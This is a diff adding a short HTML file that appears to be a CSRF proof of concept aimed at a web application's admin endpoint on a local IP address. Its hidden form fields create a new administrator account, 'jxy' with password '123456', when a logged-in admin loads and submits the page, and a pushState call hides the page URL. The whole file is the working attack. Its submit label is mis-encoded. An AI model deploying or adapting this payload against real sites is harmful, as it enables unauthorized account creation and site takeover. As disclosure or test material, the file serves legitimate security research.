@@ -1,0 +1,14 @@
+<html>
+ 
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.138.142/gxl/index.php?s=Admin-Admin-Insert" method="POST">
+      <input type="hidden" name="admin&#95;name" value="jxy" />
+      <input type="hidden" name="admin&#95;pwd" value="123456" />
+      <input type="hidden" name="admin&#95;repwd" value="123456" />
+      <input type="hidden" name="submit" value="?&#143;&#144;?o&#164;" />
+      <input type="hidden" name="&#95;&#95;hash&#95;&#95;" value="fbf706b4d2da7b14e991567f3fbda33b" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
